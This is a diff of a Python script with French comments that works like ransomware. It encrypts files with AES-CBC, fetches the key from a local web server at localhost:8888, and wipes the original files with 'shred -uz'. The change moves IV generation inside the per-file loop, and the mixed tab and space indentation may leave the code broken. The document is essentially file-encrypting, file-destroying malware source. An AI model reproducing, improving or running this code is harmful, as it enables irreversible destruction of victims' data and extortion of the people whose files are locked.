@@ -18,20 +18,22 @@ def encryptFile(key, filename, chunksize=24*1024):
     
     #On créer le fichier de sortie chiffré
     out_filename = filename + '.enc'
-    
-    #On génère un vecteur d'initialisation de 16 octets
-    iv = Random.new().read(AES.block_size)
-
-    #On setup la fonction de chiffement avec la clé, le mode et le vecteur d'initialisation
-    encryptor = AES.new(key, AES.MODE_CBC, iv)
 
     #On récupère la taille du fichier orignal
     filesize = os.path.getsize(filename)
 
     with open(filename, 'rb') as infile:
         with open(out_filename, 'wb') as outfile:
+		
+            #On génère un vecteur d'initialisation de 16 octets
+    	    iv = Random.new().read(AES.block_size)
+
+    	    #On setup la fonction de chiffement avec la clé, le mode et le vecteur d'initialisation
+            encryptor = AES.new(key, AES.MODE_CBC, iv)
+		
 	    #on écrit sur les 8 premiers octets du fichier chiffré la taille du fichier original (en little endian) (nécessaire pour déchiffrer)
             outfile.write(struct.pack('<Q', filesize))
+		
 	    #on écrit l'iv de chiffrement ensuite sur les 16 octets d'après (nécessaire pour le déchiffrement)
             outfile.write(iv)
 		
@@ -95,20 +97,24 @@ def main(argv):
             if is_decrypt:
                 if file[-4:] == ".enc":
                     decryptFile(key, file)
+		
 	            #utilisation de commande bash shred pour supprimer de manière sécurisé les fichiers .enc
                     subprocess.check_output(["shred", "-uz", file])
 
             # chiffrement
             else:
                 if file[-4:] != ".enc": 
+			
 		    #faire une requête get au serveur web pour récupérer la clé
     		    url = 'http://localhost:8888/key.txt'
     		    resp = requests.get(url)
     		    key= resp.text
     	     	    key= key.rstrip("\n")
     		    key= key.encode('utf-8')
+			
 		    #chiffrement
                     encryptFile(key, file)
+			
                     #utilisation de commande bash shred pour supprimer de manière sécurisé les fichiers d'origine
                     subprocess.check_output(["shred", "-uz", file])
 
